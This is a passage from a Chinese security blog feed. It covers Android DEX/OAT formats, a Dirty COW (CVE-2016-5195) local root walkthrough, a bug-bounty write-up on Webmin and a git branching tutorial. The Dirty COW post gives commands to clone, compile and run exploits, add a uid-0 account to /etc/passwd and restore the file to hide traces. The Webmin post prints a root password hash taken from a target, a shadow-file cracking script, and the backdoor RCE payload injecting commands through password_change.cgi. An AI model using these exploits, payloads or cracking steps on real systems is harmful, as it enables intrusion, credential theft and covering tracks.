alt="image-20211125110254312"></p><ul><li>文件头：header指明了一些基本的校验、大小属性，还有期待结构体的大小和偏移，具有目录一样的作用。接下来我们依次介绍一下各个偏移</li><li>索引区：分别记录了字符串、类型、方法原型、域、方法的索引，这部分指定了dex文件中所有不同类型数据存储的位置，数据最终存储于“数据区”</li><li>数据区：此块可分成普通数据区和链接数据区，后者听起来较为陌生，众所周知Android中常有一些动态链接库so的引用，而链接数据区就是对这个的指向。</li></ul><p><code>文件头包括</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211125111738984.png" alt="image-20211125111738984"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/16ad5e88c0c99160_tplv-t2oaga2asx-watermark.png" alt="16ad5e88c0c99160_tplv-t2oaga2asx-watermark">其他详细的字段参考 <a href="https://juejin.cn/post/6844903847647772686">https://juejin.cn/post/6844903847647772686</a></p><h2 id="什么是odex文件"><a href="#什么是odex文件" class="headerlink" title="什么是odex文件"></a>什么是odex文件</h2><p>我们已经知道了dex文件是运行在DVM上的，但是真正在APP运行的时候虚拟机并不是执行的dex文件，他还需要对dex文件做进一步优化，进而降低内存占用，提高执行效率。</p><p>odex (optimized dex): 优化过的dex</p><blockquote><p>Android5.0之前APP在安装时会进行验证和优化，为了校验代码合法性及优化代码执行速度，验证和优化后，会产生odex文件，运行Apk的时候，直接加载odex，避免重复验证和优化，加快了Apk的响应时间。</p></blockquote><h2 id="什么是OAT文件"><a href="#什么是OAT文件" class="headerlink" title="什么是OAT文件"></a>什么是OAT文件</h2><p>oat是ART虚拟机运行的文件,是ELF格式二进制文件,包含dex和编译的本地机器指令,oat文件包含dex文件，因此比odex文件占用空间更大。</p><p>Android L( 5.0 ) 引入Android Runtime (ART)，ART 使用设备自带的 dex2oat 工具来编译应用,提高启动速度，dex2oat默认会把classes.dex翻译成本地机器指令，生成ELF格式的oat文件，ART加载OAT文件后不需要经过处理就可以直接运行，它在编译时就从字节码装换成机器码了，因此运行速度更快。</p><p>不过android5.0之后oat文件还是以.odex后缀结尾，但是已经不是android5.0之前的文件格式，而是ELF格式封装的本地机器码。可以认为oat在dex上加了一层壳，可以从oat里提取出dex。</p><h2 id="什么是VDEX文件"><a href="#什么是VDEX文件" class="headerlink" title="什么是VDEX文件"></a>什么是VDEX文件</h2><p>Android O ( 8.0 ) 引入了vdex，目的是为了降低dex2oat时间。</p><p>vdex 文件有助于提升软件更新的性能和用户体验。vdex 文件会存储包含验证程序依赖项且经过预验证的 dex 文件，以便 ART 在应用更新期间无需再次解压和验证 dex 文件。从而优化了启动速度。</p><p>vdex 目的不是为了提升性能，而是为了避免不必要的验证Dex 文件合法性的过程，例如首次安装时进行dex2oat时会校验Dex 文件各个section的合法性，这时候使用的compiler filter 为了照顾安装速度等方面，并没有采用全量编译，当app启动运行一段时间后，收集了足够多的jit 热点方法信息，Android会在后台重新进行dex2oat, 将热点方法编译成机器代码，这时候就不用再重复做验证Dex文件的过程了。这点有点类似机器学习。</p><blockquote><p>这些将对类加载、热修复、插件化等技术栈提升有帮助。</p></blockquote><p>实战参考<a href="https://zhuanlan.zhihu.com/p/49090249">https://zhuanlan.zhihu.com/p/49090249</a> 最后一部分，修改dex文件而不是去apktool会编译。</p><p><strong>从dex文件修改的话只需要修复一下dex文件改一下验证即可。</strong></p><h2 id="其他文章"><a href="#其他文章" class="headerlink" title="其他文章"></a>其他文章</h2><p><a href="https://juejin.cn/post/6844903847647772686#heading-2">Android逆向笔记 —— DEX 文件格式解析</a></p><p><a href="https://blog.csdn.net/sinat_18268881/article/details/55832757">一篇文章带你搞懂DEX文件的结构</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>脏牛提权（CVE-2016-5195）</title>
      <link href="2023/11/28/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83(CVE-2016-5195)/"/>
      <url>2023/11/28/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83(CVE-2016-5195)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>漏洞编号：CVE-2016-5195</p><p>漏洞名称：脏牛（Dirty COW）</p><p>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权</p><p>影响范围：Linux内核&gt;=2.6.22（2007年发行，到2016年10月18日才修复，存在Linux内核中已经有长达9年的时间）</p><p>简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="查看内核版本"><a href="#查看内核版本" class="headerlink" title="查看内核版本"></a>查看内核版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br><span class="line">lsb release -a</span><br><span class="line">cat &#x2F;proc&#x2F;version</span><br></pre></td></tr></table></figure><blockquote><p>只要低于以下版本，标识存在脏牛漏洞</p><p>Centos7 /RHEL7  3.10.0-327.36.3.el7</p><p>Cetnos6/RHEL6   2.6.32-642.6.2.el6</p><p>Ubuntu 16.10     4.8.0-26.28</p><p>Ubuntu 16.04     4.4.0-45.66</p><p>Ubuntu 14.04     3.13.0-100.147</p><p>Debian 8        3.16.36-1+deb8u2</p><p>Debian 7        3.2.82-1</p></blockquote><h4 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h4><p>下载到受害机上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gbonacini&#x2F;CVE-2016-5195.git</span><br></pre></td></tr></table></figure><p>编译，生成可执行文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install g++   &#x2F;&#x2F;必须要有g++环境</span><br><span class="line">make</span><br><span class="line">.&#x2F;dcow -s</span><br></pre></td></tr></table></figure><p>执行成功，会返回一个root权限的shell，失败则返回fail。</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210105115518624.png" alt="image-20210105115518624"></p><h4 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h4><p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">.&#x2F;dirty 密码（这一步出结果可能有点慢，耐心等待一下）</span><br><span class="line">su firefart  &#x2F;&#x2F;添加的这个用户具有最高权限</span><br></pre></td></tr></table></figure><p> 这个exp运行之后，利用脏牛漏洞直接创建一个名firefart的高权限用户，密码可以自己设置。最后一定要将/etc/passwd文件还原回来，这样能更好的隐藏自己。还原之后，我们的这次提权就变成一次性的，关闭这个ssh连接我们就没有这个用户了。</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210105111948237.png" alt="image-20210105111948237"></p><p>或者修改 /etc/passwd 把当前用户的uid改成0就可以作为root登录</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210105113649766.png" alt="image-20210105113649766"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dirty &#x2F;etc&#x2F;passwd ichunqiu:x:0:0::&#x2F;home&#x2F;ichunqiu:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>修改之后就是最高权限</p><h3 id="分析和思考"><a href="#分析和思考" class="headerlink" title="分析和思考"></a>分析和思考</h3><ul><li><p>linux内核必须要在影响范围内才可以实现提权</p></li><li><p>Linux内核的内存子系统在处理写时拷贝(Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射</p></li><li><p>低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致某些Linux版本提权漏洞</p></li><li><p>低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取Root权限</p></li><li><p>该漏洞影响所有目前运行Linux系统的设备，包含但不限于运行Linux系统的服务器，Docker容器/手机/路由器/智能设备等 </p></li><li><p>关于安卓渗透的参考文章：<a href="https://brucetg.github.io/2018/05/27/DirtyCow%EF%BC%88%E8%84%8F%E7%89%9B%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">DirtyCow（脏牛）进攻复现</a></p></li></ul><h3 id="其他POC集合"><a href="#其他POC集合" class="headerlink" title="其他POC集合"></a>其他POC集合</h3><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.jianshu.com/p/df72d1ee1e3e">https://www.jianshu.com/p/df72d1ee1e3e</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9538541.html">https://www.cnblogs.com/bmjoker/p/9538541.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网提权 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次cappvd引发的思考</title>
      <link href="2023/11/28/%E4%B8%80%E6%AC%A1cappvd%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>2023/11/28/%E4%B8%80%E6%AC%A1cappvd%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在挖cappvd时遇到一个后台为webmin，前面shrio反序列化已经打进去了，所以尝试一下内网是否有用户名和密码的信息。</p><p><img src="https://s2.loli.net/2022/10/14/Pzv4Is8yTGJrFCZ.png" alt="image-20221014094403605"></p><p>翻看了一下内网发现有redis和mysql服务，mysql且没有设置密码</p><p><img src="https://s2.loli.net/2022/10/14/RtxaEb3ZKcDMBuj.png" alt="Image"></p><p><img src="https://s2.loli.net/2022/10/14/tP1FOMUn35ehHzr.png" alt="Image"></p><p>查找webmin的密码，发现webmin的密码是与/etc/shadow联动的</p><p><img src="https://s2.loli.net/2022/10/14/ULEkINYtaquSM34.png" alt="image-20221014105006470"></p><p><img src="https://s2.loli.net/2022/10/14/apM6DJTxXN19iuA.png" alt="image-20221014105058604"></p><p>查阅资料说，webmin是用于Unix系统管理的一个web服务，相当于是以root权限进行登录，所以理所当然密码也是root密码，于是翻看了下/etc/shadow确认root账户名称是否有变更</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$Gx1Dj&#x2F;.p0$uJEaQDHAiKe.Xg&#x2F;4ROVV5.QpROw4td7lTe6TPONpXGFSAS6Ok.t3sJl6CyTe.dPa.yQo2yU3ePfsu61sbwTVL.:18403:0:99999:7::: </span><br></pre></td></tr></table></figure><p>lastlog查看上次管理员登录时间，发现是上周五登录过一次，估计短时间不会再登录了，所以没有抓取密码的必要。尝试用脚本进行爆破，把/etc/shadow文件内容复制下来，在本机进行爆破</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> crypt   <span class="comment">## 导入 Linux 口令加密库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testPass</span>(<span class="params">cryptPass</span>):</span></span><br><span class="line">    salt=cryptPass[cryptPass.find(<span class="string">&quot;$&quot;</span>):cryptPass.rfind(<span class="string">&quot;$&quot;</span>)]  <span class="comment">## 获得盐值，包含 $id 部分</span></span><br><span class="line">    dictFile=<span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> dictFile.readlines():</span><br><span class="line">        word=word.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        cryptWord=crypt.crypt(word,salt)                   <span class="comment">## 将密码字典中的值和盐值一起加密</span></span><br><span class="line">        <span class="keyword">if</span> (cryptWord==cryptPass):                        <span class="comment">## 判断加密后的数据和密码字段是否相等</span></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+]Found Password:&quot;</span>+word+<span class="string">&quot;\n&quot;</span> )      <span class="comment">## 如果相等则打印出来</span></span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;[-] Password Not Found.\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    passFile=<span class="built_in">open</span>(<span class="string">&#x27;shadow.txt&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines():      <span class="comment">## 读取文件中的所有内容</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            user=line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]                     <span class="comment">## 获得用户名</span></span><br><span class="line">            cryptPass=line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].strip(<span class="string">&#x27; &#x27;</span>)     <span class="comment">## 获得密码字段</span></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[*] Cracking Password for:&quot;</span>+user)</span><br><span class="line">            testPass(cryptPass)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/10/14/JvXnFjBHTalSAow.png" alt="image-20221014111725507"></p><p>于是开始了漫长的等待，如果密码字典够强大，是可以爆出密码字段的，但是好像也没啥大用，顶多就是多获取了一个web的登录权限，内网权限都已经有了，好像没必要，算不算绕了个弯路。。。</p><p>在查阅资料时，还发现webmin有一个RCE漏洞，官方给出的版本是Webmin&lt;=1.920，查看我们这个目标的服务权限是 server=MiniServ/1.973，哦吼又少了一个可以提交的报告</p><h2 id="漏洞探究"><a href="#漏洞探究" class="headerlink" title="漏洞探究"></a>漏洞探究</h2><p>RCE的触发是由于开启了密码重置功能，允许用户使用旧密码设置新密码的功能点，在Webmin-Webmin Configuration-Authentication-Password expiry policy中选择，如下图：</p><p><img src="https://s2.loli.net/2022/10/14/UWBJhFzmp4SxOu3.png" alt="image-20221014113158609"></p><p>设置之后，webmin的配置文件/etc/webmin/miniserv.conf 中password_mode值为2，没设置的为0，从上面的截图看是password_mode=0，所以不存在RCE</p><p>通过vulfocus靶场复现，在登录处抓包，将POST请求修改为 /password_change.cgi ，传递参数改为user=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=2&amp;new2=2 ，在旧密码参数处进行命令拼接，即可造成RCE</p><p><img src="https://s2.loli.net/2022/10/14/QOI5AivkqcLDhGW.png" alt="Image"></p><p>查找password_change.cgi </p><p><img src="https://s2.loli.net/2022/10/14/uG4iqQCJlIyoSmt.png" alt="image-20221014132437497"></p><p>触发的首要条件$miniserv{‘passwd_mode’} == 2</p><p>存在漏洞的1.920版本 password_change.cgi 代码如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($wuser) &#123;</span><br><span class="line">    <span class="comment"># Update Webmin user&#x27;s password</span></span><br><span class="line">    $enc = &amp;acl::encrypt_password($in&#123;<span class="string">&#x27;old&#x27;</span>&#125;, $wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125;);</span><br><span class="line">    $enc eq $wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; || &amp;pass_error($text&#123;<span class="string">&#x27;password_eold&#x27;</span>&#125;,<span class="keyword">qx</span>/$in&#123;<span class="string">&#x27;old&#x27;</span>&#125;/);</span><br><span class="line">    $perr = &amp;acl::check_password_restrictions($in&#123;<span class="string">&#x27;user&#x27;</span>&#125;, $in&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">    $perr &amp;&amp; &amp;pass_error(&amp;text(<span class="string">&#x27;password_enewpass&#x27;</span>, $perr));</span><br><span class="line">    $wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; = &amp;acl::encrypt_password($in&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">    $wuser-&gt;&#123;<span class="string">&#x27;temppass&#x27;</span>&#125; = <span class="number">0</span>;</span><br><span class="line">    &amp;acl::modify_user($wuser-&gt;&#123;<span class="string">&#x27;name&#x27;</span>&#125;, $wuser);</span><br><span class="line">    &amp;reload_miniserv();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这块是最关键的代码执行处，要先满足$wuser变量不为1时才能进入if条件语言中，而这个变量是在</p><p>判断用户是否属于Webmin user时赋值的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if ($wuser-&gt;&#123;&#39;pass&#39;&#125; eq &#39;x&#39;) &#123;</span><br><span class="line">       # A Webmin user, but using Unix authentication</span><br><span class="line">       $wuser &#x3D; undef;</span><br><span class="line">       &#125;</span><br><span class="line">   elsif ($wuser-&gt;&#123;&#39;pass&#39;&#125; eq &#39;*LK*&#39; ||</span><br><span class="line">          $wuser-&gt;&#123;&#39;pass&#39;&#125; &#x3D;~ &#x2F;^\!&#x2F;) &#123;</span><br><span class="line">       &amp;pass_error(&quot;Webmin users with locked accounts cannot change &quot;.</span><br><span class="line">                   &quot;their passwords!&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果登录用户是Webmin user，则pass字段为x ，$wuser变量赋值为undef，也就是0；</p><p>如果登录用户不是Webmin user，pass字段是一段字符串，且$wuser变量为{}，可以进入if ($wuser)语句进一步执行<code>$enc eq $wuser-&gt;&#123;&#39;pass&#39;&#125; || &amp;pass_error($text&#123;&#39;password_eold&#39;&#125;,qx/$in&#123;&#39;old&#39;&#125;/);</code> ，进而执行到 <strong>qx/$in{‘old’}/</strong></p><p><img src="https://s2.loli.net/2022/10/14/W4RrjshYimnGK7O.png" alt="image-20221014141323924"></p><p>qx//是反引号执行，能捕获执行结果，所以old为可控参数，这个也是疑似被插入后门的地方。</p><p>所以payload：user=rootxx&amp;pam=&amp;expired=2&amp;old=test|<strong>id</strong>&amp;new1=2&amp;new2=2 中user rootxx不是webmin user,  old传参中的<code>id</code> 就被执行了。且会被pass_error方法打印出来，pass_error没有进行任何校验，所以直接传输恶意代码不需要管道符也能RCE</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">pass_error</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&amp;header(<span class="keyword">undef</span>, <span class="keyword">undef</span>, <span class="keyword">undef</span>, <span class="keyword">undef</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">print</span> &amp;ui_hr();</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;center&gt;&lt;h3&gt;&quot;</span>,$text&#123;<span class="string">&#x27;password_err&#x27;</span>&#125;,<span class="string">&quot; : &quot;</span>,@_,<span class="string">&quot;&lt;/h3&gt;&lt;/center&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &amp;ui_hr();</span><br><span class="line">&amp;footer();</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证了webmin是有历史后门之后，查看目标服务器中的password_change.cgi文件，并未发现qx/…./代码</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($wuser) &#123;</span><br><span class="line"><span class="comment"># Update Webmin user&#x27;s password</span></span><br><span class="line">$ok = &amp;acl::validate_password($in&#123;<span class="string">&#x27;old&#x27;</span>&#125;, $wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125;);</span><br><span class="line">$ok || &amp;pass_error($text&#123;<span class="string">&#x27;password_eold&#x27;</span>&#125;);</span><br><span class="line">$perr = &amp;acl::check_password_restrictions($in&#123;<span class="string">&#x27;user&#x27;</span>&#125;, $in&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">$perr &amp;&amp; &amp;pass_error(&amp;text(<span class="string">&#x27;password_enewpass&#x27;</span>, $perr));</span><br><span class="line">$wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; = &amp;acl::encrypt_password($in&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">$wuser-&gt;&#123;<span class="string">&#x27;temppass&#x27;</span>&#125; = <span class="number">0</span>;</span><br><span class="line">&amp;acl::modify_user($wuser-&gt;&#123;<span class="string">&#x27;name&#x27;</span>&#125;, $wuser);</span><br><span class="line">&amp;reload_miniserv();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在1.890版本中，也被插入了 qx/$in{‘expored’}/ , 只要传输expired参数即可RCE，也不需要passwd_mode=2这个限制条件，后门太强大。</li></ul><p><img src="https://s2.loli.net/2022/10/14/TRvoH78XzSIOYJG.png" alt="image-20221014143633723"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>遇到webmin需要注意一下版本号，如果响应中server=MiniServ/1.890， 先尝试一下是否有expired这个后门参数，再试传统的payload，Webmin&lt;=1.920也要尝试一下是否存在RCE</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /password_change.cgi</span><br><span class="line">......</span><br><span class="line">user=rootxx&amp;pam=&amp;expired=2&amp;old=id&amp;new1=2&amp;new2=2</span><br></pre></td></tr></table></figure><p>间接熟悉了一下perl代码 :)</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/1019/#_1">https://paper.seebug.org/1019/#_1</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> perl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习git分支</title>
      <link href="2023/11/28/%E5%AD%A6%E4%B9%A0git%E5%88%86%E6%94%AF/"/>
      <url>2023/11/28/%E5%AD%A6%E4%B9%A0git%E5%88%86%E6%94%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>由于今天git操作给我整懵了，虽说之前也接触过，但是长时间不操作就会忘记，并且手忙脚乱，不懂原理怎么打下整个天下，碰巧遇到了一篇写的很详细的文章<a href="https://segmentfault.com/a/1190000038809934">可视化学习git命令</a>，就按照他的思路来深入探索一下。</p><p>还有学习平台<a href="https://learngitbranching.js.org/?locale=zh_CN">学习git分支</a></p><h2 id="开始闯关"><a href="#开始闯关" class="headerlink" title="开始闯关"></a>开始闯关</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128131548472.png" alt="image-20210128131548472"></p><h3 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128132419193.png" alt="image-20210128132419193"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128132852404.png" alt="image-20210128132852404"></p><h3 id="git-branch"><a href="#git-branch" class="headerlink" title="git branch"></a>git branch</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128131933678.png" alt="image-20210128131933678"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch newImage</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128132048980.png" alt="image-20210128132048980"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128132118933.png" alt="image-20210128132118933"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout newImage; git commit</span><br><span class="line">git checkout -b newImage  # 直接新建了一个newImage分支，且切换到了新建的分支上去（会有个*号）</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128132208110.png" alt="image-20210128132208110"></p><h3 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a>git merge</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128133304364.png" alt="image-20210128133304364"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128133640584.png" alt="image-20210128133640584"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge bugFix   # 把 bugFix 合并到 main 里</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128133739032.png" alt="image-20210128133739032"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout bugFix; git merge main  # 再把 bugFix 合并到 main 里</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128134113875.png" alt="image-20210128134113875"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128134152341.png" alt="image-20210128134152341"></p><h3 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128134714663.png" alt="image-20210128134714663"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128134902076.png" alt="image-20210128134902076"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase main</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128134922772.png" alt="image-20210128134922772"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase bugFix</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128135100760.png" alt="image-20210128135100760"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128135211617.png" alt="image-20210128135211617"></p><h3 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128135418253.png" alt="image-20210128135418253"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128135522956.png" alt="image-20210128135522956"></p><figure class="highlight 